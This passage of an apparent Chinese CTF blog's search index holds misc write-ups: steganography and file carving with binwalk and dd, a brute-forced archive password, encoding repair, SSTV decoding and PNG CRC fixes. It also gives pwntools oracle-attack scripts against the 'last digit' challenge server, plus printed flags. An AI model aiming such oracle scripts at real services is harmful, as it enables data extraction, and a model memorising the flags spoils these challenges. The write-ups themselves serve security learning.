DAQOWJHNSEKUP*Z & 8 #294BC%^V$3@)(R-FT05=L76ohqdujlmczxnpbvtr![;,. '","title":"gakki"},{"location":"misc/gakki/#_1","text":"emm\u2026\u2026\u662f\u4e00\u5f20\u65b0\u57a3\u7ed3\u8863\u7684\u7167\u7247\u3010\u4e0d\u662f\u91cd\u70b9\uff01(\u03a6\u76bf\u03a6\u256c)\u3011\u770b\u770b\u6709\u6ca1\u6709\u85cf\u2026\u2026\u6709\u7684\uff01\u7528 dd \u5206\u79bb\u51fa\u6765~ 1 2 3 4 5 6 7 8 9 10 11 12 $ binwalk wolaopo.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 137448 0x218E8 RAR archive data, first volume type: MAIN_HEAD $ dd if = wolaopo.jpg of = tmp.rar skip = 137448 bs = 1 79776 +0 records in 79776 +0 records out 79776 bytes ( 80 kB, 78 KiB ) copied, 1 .73609 s, 46 .0 kB/s \u5206\u79bb\u51fa\u6765\u7684\u538b\u7f29\u6587\u4ef6\u9700\u8981\u8f93\u5165\u5bc6\u7801\u89e3\u538b\uff0c\u7206\u7834\u83b7\u5f97\u5bc6\u7801 8864 \u89e3\u538b\u540e\u5f97\u5230\u6587\u4ef6 flag.txt \uff0c\u6587\u4ef6\u5185\u5bb9\u2026\u2026\u662f\u4e2a\u5565\uff1f\uff1f \u8d77\u521d\u731c\u6d4b\u662f\u67d0\u79cd\u7279\u6b8a\u7684\u7f16\u7801\uff0c\u5495\u679c\u65e0\u679c\u2026\u2026\u7adf\u7136\u662f\u7edf\u8ba1\u5b57\uff08\u7b26\uff09\u9891\uff01\u3010\u5b8c\u5168\u6ca1\u60f3\u5230\u3011 1 2 3 4 5 6 7 8 9 10 11 12 13 14 f = open ( 'flag.txt' , 'r' ) content = f . read () f . close () cnt = dict () for i in content : if ( i == ' \\n ' ): continue if i in cnt : cnt [ i ] += 1 else : cnt [ i ] = 1 ans = { k : v for k , v in sorted ( cnt . items (), key = lambda item : item [ 1 ], reverse = True )} for i in ans : print ( i , end = '' ) \u7edf\u8ba1\u5b8c\u540e\uff0c\u6309\u9891\u7387\u4ece\u9ad8\u5230\u4f4e\u6392\u5217\uff0c\u6210\u529f\u83b7\u53d6 flag\uff01 1 2 $ python3 gakki.py GXY { gaki_IsMyw1fe } DAQOWJHNSEKUP*Z & 8 #294BC%^V$3@)(R-FT05=L76ohqdujlmczxnpbvtr![;,. '","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/gibberish_message/","text":"\u4e71\u7801\u53ca\u4ea7\u751f\u539f\u56e0 \u00b6 \u89e3\u9898\u601d\u8def \u00b6 \u4e0b\u8f7d\u6587\u4ef6\u540e \u4f7f\u7528 UTF-8 \u6253\u5f00 \uff0c\u5f97\u5230\u7684\u5185\u5bb9\u591a\u4e3a\u4e0d\u5e38\u89c1\u7684\u6c49\u5b57\uff0c\u63a8\u6d4b\u5bf9\u5e94\u8868\u683c\u4e2d\u7684\u53e4\u6587\u7801\u3002\u800c\u53e4\u6587\u7801\u662f\u300e \u4ee5 GBK \u65b9\u5f0f \u8bfb\u53d6 UTF-8 \u7f16\u7801\u300f\u4ea7\u751f\u7684\uff0c\u90a3\u4e48\u4ee5\u4e0b\u5185\u5bb9\u5e94\u8be5\u662f\u4ee5 GBK \u65b9\u5f0f\u8bfb\u53d6 UTF-8 \u7f16\u7801\u540e\u518d\u4ee5 UTF-8 \u4fdd\u5b58\u7684\u7ed3\u679c\uff08\u957f\u5ea6\u4e3a\u5076\u6570\uff0c\u6240\u4ee5\u4e0d\u51fa\u73b0\u95ee\u53f7\uff09 \u901a\u8fc7\u7f16\u7801\u4fdd\u5b58 -> \u9009\u62e9 GBK\uff0c\u518d\u4f7f\u7528 UTF-8 \u6253\u5f00\uff0c\u5f97\u5230\u62fc\u97f3\u7801 \u901a\u8fc7\u7f16\u7801\u4fdd\u5b58 -> \u9009\u62e9 ISO8859-1\uff0c\u518d\u4f7f\u7528 GBK \u6253\u5f00\uff0c\u6210\u529f\u83b7\u53d6 Flag \u6700\u540e\u8981\u5c06\u5168\u89d2\u5b57\u7b26\u8f6c\u6362\u4e3a\u534a\u89d2\u5b57\u7b26\uff1a flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_9qD2R8hs}","title":"\u4ece\u96f6\u5f00\u59cb\u7684\u706b\u661f\u6587\u751f\u6d3b"},{"location":"misc/gibberish_message/#_1","text":"","title":"\u4e71\u7801\u53ca\u4ea7\u751f\u539f\u56e0"},{"location":"misc/gibberish_message/#_2","text":"\u4e0b\u8f7d\u6587\u4ef6\u540e \u4f7f\u7528 UTF-8 \u6253\u5f00 \uff0c\u5f97\u5230\u7684\u5185\u5bb9\u591a\u4e3a\u4e0d\u5e38\u89c1\u7684\u6c49\u5b57\uff0c\u63a8\u6d4b\u5bf9\u5e94\u8868\u683c\u4e2d\u7684\u53e4\u6587\u7801\u3002\u800c\u53e4\u6587\u7801\u662f\u300e \u4ee5 GBK \u65b9\u5f0f \u8bfb\u53d6 UTF-8 \u7f16\u7801\u300f\u4ea7\u751f\u7684\uff0c\u90a3\u4e48\u4ee5\u4e0b\u5185\u5bb9\u5e94\u8be5\u662f\u4ee5 GBK \u65b9\u5f0f\u8bfb\u53d6 UTF-8 \u7f16\u7801\u540e\u518d\u4ee5 UTF-8 \u4fdd\u5b58\u7684\u7ed3\u679c\uff08\u957f\u5ea6\u4e3a\u5076\u6570\uff0c\u6240\u4ee5\u4e0d\u51fa\u73b0\u95ee\u53f7\uff09 \u901a\u8fc7\u7f16\u7801\u4fdd\u5b58 -> \u9009\u62e9 GBK\uff0c\u518d\u4f7f\u7528 UTF-8 \u6253\u5f00\uff0c\u5f97\u5230\u62fc\u97f3\u7801 \u901a\u8fc7\u7f16\u7801\u4fdd\u5b58 -> \u9009\u62e9 ISO8859-1\uff0c\u518d\u4f7f\u7528 GBK \u6253\u5f00\uff0c\u6210\u529f\u83b7\u53d6 Flag \u6700\u540e\u8981\u5c06\u5168\u89d2\u5b57\u7b26\u8f6c\u6362\u4e3a\u534a\u89d2\u5b57\u7b26\uff1a flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_9qD2R8hs}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/hearing_not_believing/","text":"\u9898\u76ee \u00b6 Hearing is not believing \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b hearing.wav \u9891\u8c31\u56fe\uff0c\u6709\u4e09\u6bb5\u88ab\u5207\u5206\u7684\u4e8c\u7ef4\u7801 \u62fc\u63a5\u626b\u7801\u540e\u83b7\u5f97\u4e00\u90e8\u5206 Flag\uff1a m4yB3_ \u5269\u4e0b\u5c31\u662f\u4e00\u6bb5\u770b\u4e0a\u53bb\u5f88\u6574\u9f50\u7684\u97f3\u9891 (\u014f\u03c9\u014f) \u672c\u6765\u8fd8\u4ee5\u4e3a\u4f1a\u548c\u4e2d\u95f4\u7684\u5c0f\u7ad6\u7ebf\u6709\u5173\uff0c\u56e0\u4e3a\u521a\u597d\u662f \\(8\\) \u7684\u500d\u6570\uff0c\u53c8\u6709\u660e\u663e\u7684\u4e8c\u5143\u533a\u522b\uff0c\u8fd8\u80fd\u89e3\u51fa\u6765 IR \ud83e\udd27 \u7ed3\u679c\u8dd1\u504f\u4e86\u2026\u2026 \u6700\u540e\u662f SSTV\uff0c\u6162\u626b\u63cf\u7535\u89c6\uff08Slow-scan television\uff09 Linux \u4e0b\u7528 qsstv \u5c31\u53ef\u4ee5\uff0c\u80fd\u5f97\u5230 \\(16\\) \u5f20\u56fe\u7247\uff0c\u62fc\u8d77\u6765\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 \u7531\u4e8e\u6ca1\u6cd5\u76f4\u63a5\u626b\u51fa\u6765\uff0c\u8fd8\u8981\u518d\u624b\u5de5\u63cf\u4e00\u4e0b\u56fe (\u2565\u03c9\u2565) \u83b7\u5f97\u53e6\u4e00\u90e8\u5206 Flag\uff1a U_kn0W_S57V} \u62fc\u4e00\u4e0b\uff1a ByteCTF{m4yB3_U_kn0W_S57V} \u53c2\u8003\u94fe\u63a5 \u00b6 Decoding SSTV from a file using Linux","title":"HearingNotBelieving"},{"location":"misc/hearing_not_believing/#_1","text":"Hearing is not believing","title":"\u9898\u76ee"},{"location":"misc/hearing_not_believing/#_2","text":"\u67e5\u770b hearing.wav \u9891\u8c31\u56fe\uff0c\u6709\u4e09\u6bb5\u88ab\u5207\u5206\u7684\u4e8c\u7ef4\u7801 \u62fc\u63a5\u626b\u7801\u540e\u83b7\u5f97\u4e00\u90e8\u5206 Flag\uff1a m4yB3_ \u5269\u4e0b\u5c31\u662f\u4e00\u6bb5\u770b\u4e0a\u53bb\u5f88\u6574\u9f50\u7684\u97f3\u9891 (\u014f\u03c9\u014f) \u672c\u6765\u8fd8\u4ee5\u4e3a\u4f1a\u548c\u4e2d\u95f4\u7684\u5c0f\u7ad6\u7ebf\u6709\u5173\uff0c\u56e0\u4e3a\u521a\u597d\u662f \\(8\\) \u7684\u500d\u6570\uff0c\u53c8\u6709\u660e\u663e\u7684\u4e8c\u5143\u533a\u522b\uff0c\u8fd8\u80fd\u89e3\u51fa\u6765 IR \ud83e\udd27 \u7ed3\u679c\u8dd1\u504f\u4e86\u2026\u2026 \u6700\u540e\u662f SSTV\uff0c\u6162\u626b\u63cf\u7535\u89c6\uff08Slow-scan television\uff09 Linux \u4e0b\u7528 qsstv \u5c31\u53ef\u4ee5\uff0c\u80fd\u5f97\u5230 \\(16\\) \u5f20\u56fe\u7247\uff0c\u62fc\u8d77\u6765\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 \u7531\u4e8e\u6ca1\u6cd5\u76f4\u63a5\u626b\u51fa\u6765\uff0c\u8fd8\u8981\u518d\u624b\u5de5\u63cf\u4e00\u4e0b\u56fe (\u2565\u03c9\u2565) \u83b7\u5f97\u53e6\u4e00\u90e8\u5206 Flag\uff1a U_kn0W_S57V} \u62fc\u4e00\u4e0b\uff1a ByteCTF{m4yB3_U_kn0W_S57V}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/hearing_not_believing/#_3","text":"Decoding SSTV from a file using Linux","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"misc/hide_and_seek/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u5e38\u89c4\u6d41\u7a0b\u8d70\u4e00\u904d 1 2 3 4 5 6 7 8 9 $ file \u85cf\u85cf\u85cf.jpg \u85cf\u85cf\u85cf.jpg: JPEG image data, JFIF standard 1 .01, resolution ( DPI ) , density 72x72, segment length 16 , baseline, precision 8 , 800x566, frames 3 $ binwalk \u85cf\u85cf\u85cf.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 63967 0xF9DF End of Zip archive \u85cf\u6709\u4e00\u4e2a ZIP \u6587\u4ef6\uff01\u4f46\u662f\u4e3a\u4ec0\u4e48\u53ea\u6709\u7ed3\u5c3e\u7684\u4f4d\u7f6e (\u014f\u03c9\u014f) \uff1f\u4f7f\u7528 010Editor \u67e5\u770b\uff0c\u6587\u4ef6\u8fd8\u662f\u5f88\u5b8c\u6574\u7684\uff0c\u5f00\u5934\u6807\u8bc6\u548c\u7ed3\u5c3e\u6807\u8bc6\u90fd\u53ef\u4ee5\u627e\u5230 \u4f7f\u7528 010Editor \u65b0\u5efa\u5341\u516d\u8fdb\u5236\u6587\u4ef6\uff0c\u590d\u5236 ZIP \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6587\u672c\uff0c\u5e76\u7c98\u8d34\u81f3\u65b0\u6587\u4ef6\u3002\u89e3\u538b ZIP \u6587\u4ef6\u5f97\u5230 \u798f\u5229.docx \uff0c\u5185\u5bb9\u4e3a\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u626b\u7801\u83b7\u5f97 flag","title":"\u85cf\u85cf\u85cf"},{"location":"misc/hide_and_seek/#_1","text":"\u5e38\u89c4\u6d41\u7a0b\u8d70\u4e00\u904d 1 2 3 4 5 6 7 8 9 $ file \u85cf\u85cf\u85cf.jpg \u85cf\u85cf\u85cf.jpg: JPEG image data, JFIF standard 1 .01, resolution ( DPI ) , density 72x72, segment length 16 , baseline, precision 8 , 800x566, frames 3 $ binwalk \u85cf\u85cf\u85cf.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 63967 0xF9DF End of Zip archive \u85cf\u6709\u4e00\u4e2a ZIP \u6587\u4ef6\uff01\u4f46\u662f\u4e3a\u4ec0\u4e48\u53ea\u6709\u7ed3\u5c3e\u7684\u4f4d\u7f6e (\u014f\u03c9\u014f) \uff1f\u4f7f\u7528 010Editor \u67e5\u770b\uff0c\u6587\u4ef6\u8fd8\u662f\u5f88\u5b8c\u6574\u7684\uff0c\u5f00\u5934\u6807\u8bc6\u548c\u7ed3\u5c3e\u6807\u8bc6\u90fd\u53ef\u4ee5\u627e\u5230 \u4f7f\u7528 010Editor \u65b0\u5efa\u5341\u516d\u8fdb\u5236\u6587\u4ef6\uff0c\u590d\u5236 ZIP \u6587\u4ef6\u7684\u5341\u516d\u8fdb\u5236\u6587\u672c\uff0c\u5e76\u7c98\u8d34\u81f3\u65b0\u6587\u4ef6\u3002\u89e3\u538b ZIP \u6587\u4ef6\u5f97\u5230 \u798f\u5229.docx \uff0c\u5185\u5bb9\u4e3a\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u626b\u7801\u83b7\u5f97 flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/last_digit/","tags":["binary search"],"text":"#binary search .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Can you get the flag given its last digit? nc 2022.ductf.dev 30003 last-digit.py 1 2 3 4 5 6 7 8 9 10 11 12 13 with open ( '/flag.txt' , 'rb' ) as f : FLAG = int . from_bytes ( f . read () . strip (), byteorder = 'big' ) assert FLAG < 2 ** 1024 while True : print ( \"Enter your number:\" ) try : n = FLAG * int ( input ( \"> \" )) print ( \"Your digit is:\" , str ( n )[ - 1 ]) except ValueError : print ( \"Not a valid number! >:(\" ) Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 FROM python:3.10.7 RUN /usr/sbin/useradd --no-create-home -u 1000 ctf COPY flag.txt / COPY last-digit.py /home/ctf/ RUN chmod a+x /home/ctf/last-digit.py RUN apt-get update && apt-get install -y socat && rm -rf /var/lib/apt/lists/* USER ctf CMD socat \\ TCP-LISTEN:1337,reuseaddr,fork \\ EXEC: \"python -u /home/ctf/last-digit.py\" \u89e3\u9898\u601d\u8def \u00b6 Python 3.10.7 \u65b0\u589e\u4e86 integer string conversion length limitation \uff0c\u5728\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5341\u8fdb\u5236\u6570\u5728 int \u548c str \u95f4\u76f8\u4e92\u8f6c\u6362\uff0c\u4f4d\u6570\u4e0d\u80fd\u8d85\u8fc7 \\(4300\\) \u4f4d\uff0c\u5426\u5219\u4f1a\u89e6\u53d1 ValueError \u5f02\u5e38 str(n) \u53ef\u80fd\u89e6\u53d1 ValueError \u5f02\u5e38\uff0c\u7ed3\u5408\u8f93\u5165\u6765\u4e8c\u5206\u6c42\u51fa Flag \u53c2\u8003 Manger's Attack \u8fdb\u884c\u4e8c\u5206\uff0c\u8fb9\u754c \\(B\\) \u4e3a \\(10^{4300}\\) \u901a\u8fc7 \\(10^x\\) \u786e\u5b9a Flag \u7684\u4f4d\u6570\uff0c\u82e5 \\(10^{x-1} \\times\\) FLAG \u7684\u4f4d\u6570\u5c0f\u4e8e \\(4300\\) \u800c \\(10^x \\times\\) FLAG \u7684\u4f4d\u6570\u5927\u4e8e \\(4300\\) \uff0c\u90a3\u4e48 \\(10^x \\times\\) FLAG \\(\\in [B, 10B)\\) \uff0c\u7531\u6b64\u53ef\u521d\u6b65\u786e\u5b9a FLAG \\(\\in [\\frac{B}{10^x}, \\frac{B}{10^{x-1}})\\) \u8bbe\u5f53\u524d FLAG \u7684\u6700\u5c0f\u503c \\(mn=\\lfloor\\frac{B}{10^x}\\rfloor\\) \uff0c\u5f53\u524d FLAG \u7684\u6700\u5927\u503c \\(mx=\\lfloor\\frac{B}{10^{x-1} }\\rfloor\\) \uff0c \\(y=\\lfloor\\frac{2B}{mx+mn}\\rfloor\\) \uff0c\u5219 \\(y \\times \\lfloor\\frac{mx+mn}{2}\\rfloor \\approx B\\) \u5411\u670d\u52a1\u5668\u53d1\u9001 \\(y\\) \uff0c\u82e5\u89e6\u53d1 ValueError \u8bf4\u660e \\(y \\times\\) FLAG \\(\\ge B\\) \uff0c\u5219\u8bbe \\(mn=\\lceil\\frac{B}{y}\\rceil\\) \uff0c\u5426\u5219\u8bbe \\(mx=\\lfloor\\frac{B}{y}\\rfloor\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import pwn from Crypto.Util.number import long_to_bytes B = 10 ** 4300 conn = pwn . remote ( '2022.ductf.dev' , 30003 ) l , r = 4000 , 4300 while l < r : mid = ( l + r ) // 2 conn . sendafter ( '>' , f ' { 10 ** mid } \\n ' ) ret = conn . recvline () . decode () if '>:(' in ret : r = mid - 1 else : l = mid + 1 mn = B // 10 ** l mx = B // 10 ** ( l - 1 ) while mx > mn : tmp = 2 * B // ( mx + mn ) conn . sendafter ( '>' , str ( tmp ) + ' \\n ' ) ret = conn . recvline () . decode () if '>:(' in ret : mn = ( B + tmp ) // tmp else : mx = B // tmp print ( long_to_bytes ( mn )) \u5b98\u65b9 WP \u76f4\u63a5\u4e8c\u5206\u8f93\u5165\uff0c\u6700\u540e\u6839\u636e\u8fb9\u754c\u6c42\u5f97 FLAG 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import pwn from Crypto.Util.number import long_to_bytes def oracle ( x ): conn . sendlineafter ( b '> ' , str ( x ) . encode ()) o = conn . recvline () . decode () return '>:(' in o conn = pwn . remote ( '192.168.56.104' , 30003 ) U = 10 ** 4300 FLAG_BITS = 1024 lower = U // 2 ** FLAG_BITS upper = U # FLAG \u6709 1024 \u4f4d\uff0c\u81f3\u591a\u9700\u8981\u4e8c\u5206 1024 \u6b21 for _ in range ( 1024 ): middle = ( upper + lower ) // 2 if oracle ( middle ): upper = middle - 1 else : lower = middle + 1 f = ( U + middle ) // middle print ( long_to_bytes ( f )) \u867d\u7136\u6ca1\u6709\u968f\u673a\u7b97\u6cd5\uff0c\u4f46\u662f\u5b9e\u9645\u4ea4\u4e92\u65f6\u4e0d\u540c\u8fde\u63a5 limitation \u65f6\u6709\u65f6\u65e0 (\u014f\u03c9\u014f) \u539f\u56e0\u4e0d\u660e... Flag \u00b6 CTF{14288_bits_should_be_enough_for_anybody_:)}","title":"last digit"},{"location":"misc/last_digit/#_1","text":"Can you get the flag given its last digit? nc 2022.ductf.dev 30003 last-digit.py 1 2 3 4 5 6 7 8 9 10 11 12 13 with open ( '/flag.txt' , 'rb' ) as f : FLAG = int . from_bytes ( f . read () . strip (), byteorder = 'big' ) assert FLAG < 2 ** 1024 while True : print ( \"Enter your number:\" ) try : n = FLAG * int ( input ( \"> \" )) print ( \"Your digit is:\" , str ( n )[ - 1 ]) except ValueError : print ( \"Not a valid number! >:(\" ) Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 FROM python:3.10.7 RUN /usr/sbin/useradd --no-create-home -u 1000 ctf COPY flag.txt / COPY last-digit.py /home/ctf/ RUN chmod a+x /home/ctf/last-digit.py RUN apt-get update && apt-get install -y socat && rm -rf /var/lib/apt/lists/* USER ctf CMD socat \\ TCP-LISTEN:1337,reuseaddr,fork \\ EXEC: \"python -u /home/ctf/last-digit.py\"","title":"\u9898\u76ee"},{"location":"misc/last_digit/#_2","text":"Python 3.10.7 \u65b0\u589e\u4e86 integer string conversion length limitation \uff0c\u5728\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5341\u8fdb\u5236\u6570\u5728 int \u548c str \u95f4\u76f8\u4e92\u8f6c\u6362\uff0c\u4f4d\u6570\u4e0d\u80fd\u8d85\u8fc7 \\(4300\\) \u4f4d\uff0c\u5426\u5219\u4f1a\u89e6\u53d1 ValueError \u5f02\u5e38 str(n) \u53ef\u80fd\u89e6\u53d1 ValueError \u5f02\u5e38\uff0c\u7ed3\u5408\u8f93\u5165\u6765\u4e8c\u5206\u6c42\u51fa Flag \u53c2\u8003 Manger's Attack \u8fdb\u884c\u4e8c\u5206\uff0c\u8fb9\u754c \\(B\\) \u4e3a \\(10^{4300}\\) \u901a\u8fc7 \\(10^x\\) \u786e\u5b9a Flag \u7684\u4f4d\u6570\uff0c\u82e5 \\(10^{x-1} \\times\\) FLAG \u7684\u4f4d\u6570\u5c0f\u4e8e \\(4300\\) \u800c \\(10^x \\times\\) FLAG \u7684\u4f4d\u6570\u5927\u4e8e \\(4300\\) \uff0c\u90a3\u4e48 \\(10^x \\times\\) FLAG \\(\\in [B, 10B)\\) \uff0c\u7531\u6b64\u53ef\u521d\u6b65\u786e\u5b9a FLAG \\(\\in [\\frac{B}{10^x}, \\frac{B}{10^{x-1}})\\) \u8bbe\u5f53\u524d FLAG \u7684\u6700\u5c0f\u503c \\(mn=\\lfloor\\frac{B}{10^x}\\rfloor\\) \uff0c\u5f53\u524d FLAG \u7684\u6700\u5927\u503c \\(mx=\\lfloor\\frac{B}{10^{x-1} }\\rfloor\\) \uff0c \\(y=\\lfloor\\frac{2B}{mx+mn}\\rfloor\\) \uff0c\u5219 \\(y \\times \\lfloor\\frac{mx+mn}{2}\\rfloor \\approx B\\) \u5411\u670d\u52a1\u5668\u53d1\u9001 \\(y\\) \uff0c\u82e5\u89e6\u53d1 ValueError \u8bf4\u660e \\(y \\times\\) FLAG \\(\\ge B\\) \uff0c\u5219\u8bbe \\(mn=\\lceil\\frac{B}{y}\\rceil\\) \uff0c\u5426\u5219\u8bbe \\(mx=\\lfloor\\frac{B}{y}\\rfloor\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import pwn from Crypto.Util.number import long_to_bytes B = 10 ** 4300 conn = pwn . remote ( '2022.ductf.dev' , 30003 ) l , r = 4000 , 4300 while l < r : mid = ( l + r ) // 2 conn . sendafter ( '>' , f ' { 10 ** mid } \\n ' ) ret = conn . recvline () . decode () if '>:(' in ret : r = mid - 1 else : l = mid + 1 mn = B // 10 ** l mx = B // 10 ** ( l - 1 ) while mx > mn : tmp = 2 * B // ( mx + mn ) conn . sendafter ( '>' , str ( tmp ) + ' \\n ' ) ret = conn . recvline () . decode () if '>:(' in ret : mn = ( B + tmp ) // tmp else : mx = B // tmp print ( long_to_bytes ( mn )) \u5b98\u65b9 WP \u76f4\u63a5\u4e8c\u5206\u8f93\u5165\uff0c\u6700\u540e\u6839\u636e\u8fb9\u754c\u6c42\u5f97 FLAG 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import pwn from Crypto.Util.number import long_to_bytes def oracle ( x ): conn . sendlineafter ( b '> ' , str ( x ) . encode ()) o = conn . recvline () . decode () return '>:(' in o conn = pwn . remote ( '192.168.56.104' , 30003 ) U = 10 ** 4300 FLAG_BITS = 1024 lower = U // 2 ** FLAG_BITS upper = U # FLAG \u6709 1024 \u4f4d\uff0c\u81f3\u591a\u9700\u8981\u4e8c\u5206 1024 \u6b21 for _ in range ( 1024 ): middle = ( upper + lower ) // 2 if oracle ( middle ): upper = middle - 1 else : lower = middle + 1 f = ( U + middle ) // middle print ( long_to_bytes ( f )) \u867d\u7136\u6ca1\u6709\u968f\u673a\u7b97\u6cd5\uff0c\u4f46\u662f\u5b9e\u9645\u4ea4\u4e92\u65f6\u4e0d\u540c\u8fde\u63a5 limitation \u65f6\u6709\u65f6\u65e0 (\u014f\u03c9\u014f) \u539f\u56e0\u4e0d\u660e...","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/last_digit/#flag","text":"CTF{14288_bits_should_be_enough_for_anybody_:)}","title":"Flag"},{"location":"misc/leaf_cover_eyes/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u6253\u5f00\u56fe\u7247\u770b\u4e00\u773c\uff0c\u5e76\u65e0\u4efb\u4f55\u5f02\u5e38 \u5148\u7528 file \u786e\u5b9a\u4e86\u8fd9\u662f\u4e00\u4e2a PNG \u56fe\u7247 \u7136\u540e\u7528 binwalk \u770b\u4e86\u770b 1 2 3 4 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 321 x 332 , 8 -bit/color RGBA, non-interlaced 91 0x5B Zlib compressed data, compressed \u5495\uff1fzlib\uff1f\u4e4b\u524d\u6ca1\u505a\u8fc7\u7684\u683c\u5f0f\u2026\u2026\u4e4b\u540e\u5404\u79cd\u75af\u72c2\u627e\u8d44\u6599\u770b zlib \u3010\u5b8c\u5168\u8d70\u9519\u65b9\u5411\u4e86\u5495\uff01\u3011 \u5b9e\u9645\u4e0a\u8fd9\u9898\u6539\u4e00\u4e0b\u56fe\u50cf\u7684\u9ad8\u5ea6\u5c31\u53ef\u4ee5\u4e86 QWQ \u5495\u5495\u5495 \u00b6 \u7ffb\u4e86\u7ffb\u522b\u4eba\u7684 WP\uff0c\u53d1\u73b0\u4f1a\u56e0\u4e3a CRC \u9519\u8bef\u6253\u4e0d\u5f00\u56fe\u7247\u7684\u5495\uff1f\uff01\uff08\u554a\uff0c\u88ab Windows \u5bb3\u60e8\u4e86\uff09 \u3010\u9664\u4e86\u66b4\u529b\u679a\u4e3e\u5bbd\u9ad8\u6765\u5339\u914d\u539f\u6765\u7684 CRC\uff0c\u76f4\u63a5\u4fee\u6539\u5bbd\u9ad8\u540e\u518d\u66f4\u6539 CRC \u7684\u503c\u66f4\u5feb (\u03a6\u02cb\u03c9\u02ca\u03a6)\u3011 Windows \u4e0b\u4f7f\u7528 pngcheck \u6765\u5f25\u8865 QWQ 1 2 3 4 5 6 pngcheck -v 1 .png # File: 1.png (418602 bytes) # chunk IHDR at offset 0x0000c, length 13 # 321 x 332 image, 32-bit RGB+alpha, non-interlaced # CRC error in chunk IHDR (computed 55900eef, expected c20f1fc6) # ERRORS DETECTED in 1.png \u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e94\u8be5\u5c31\u53ef\u4ee5\u8054\u60f3\u5230\u8981\u4fee\u6539\u56fe\u50cf\u7684\u9ad8\u4e86\u5427\u5495\uff01","title":"\u4e00\u53f6\u969c\u76ee"},{"location":"misc/leaf_cover_eyes/#_1","text":"\u6253\u5f00\u56fe\u7247\u770b\u4e00\u773c\uff0c\u5e76\u65e0\u4efb\u4f55\u5f02\u5e38 \u5148\u7528 file \u786e\u5b9a\u4e86\u8fd9\u662f\u4e00\u4e2a PNG \u56fe\u7247 \u7136\u540e\u7528 binwalk \u770b\u4e86\u770b 1 2 3 4 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 321 x 332 , 8 -bit/color RGBA, non-interlaced 91 0x5B Zlib compressed data, compressed \u5495\uff1fzlib\uff1f\u4e4b\u524d\u6ca1\u505a\u8fc7\u7684\u683c\u5f0f\u2026\u2026\u4e4b\u540e\u5404\u79cd\u75af\u72c2\u627e\u8d44\u6599\u770b zlib \u3010\u5b8c\u5168\u8d70\u9519\u65b9\u5411\u4e86\u5495\uff01\u3011 \u5b9e\u9645\u4e0a\u8fd9\u9898\u6539\u4e00\u4e0b\u56fe\u50cf\u7684\u9ad8\u5ea6\u5c31\u53ef\u4ee5\u4e86 QWQ","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/leaf_cover_eyes/#_2","text":"\u7ffb\u4e86\u7ffb\u522b\u4eba\u7684 WP\uff0c\u53d1\u73b0\u4f1a\u56e0\u4e3a CRC \u9519\u8bef\u6253\u4e0d\u5f00\u56fe\u7247\u7684\u5495\uff1f\uff01\uff08\u554a\uff0c\u88ab Windows \u5bb3\u60e8\u4e86\uff09 \u3010\u9664\u4e86\u66b4\u529b\u679a\u4e3e\u5bbd\u9ad8\u6765\u5339\u914d\u539f\u6765\u7684 CRC\uff0c\u76f4\u63a5\u4fee\u6539\u5bbd\u9ad8\u540e\u518d\u66f4\u6539 CRC \u7684\u503c\u66f4\u5feb (\u03a6\u02cb\u03c9\u02ca\u03a6)\u3011 Windows \u4e0b\u4f7f\u7528 pngcheck \u6765\u5f25\u8865 QWQ 1 2 3 4 5 6 pngcheck -v 1 .png # File: 1.png (418602 bytes) # chunk IHDR at offset 0x0000c, length 13 # 321 x 332 image, 32-bit RGB+alpha, non-interlaced # CRC error in chunk IHDR (computed 55900eef, expected c20f1fc6) # ERRORS DETECTED in 1.png \u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e94\u8be5\u5c31\u53ef\u4ee5\u8054\u60f3\u5230\u8981\u4fee\u6539\u56fe\u50cf\u7684\u9ad8\u4e86\u5427\u5495\uff01","title":"\u5495\u5495\u5495"},{"location":"misc/lighthouse/","tags":["modular equation"],"text":"#modular equation .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: 